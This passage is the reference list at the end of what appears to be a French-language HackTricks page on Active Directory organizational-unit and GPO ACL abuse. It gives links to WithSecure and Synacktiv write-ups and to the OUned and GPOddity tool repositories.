- [13] [Une OU qui se moque de vous ? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py : exploitation des vecteurs d’attaque ACL des unités d’organisation masquées dans Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulation de services Active Directory légitimes sur le réseau : le cas de l’exploitation des GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
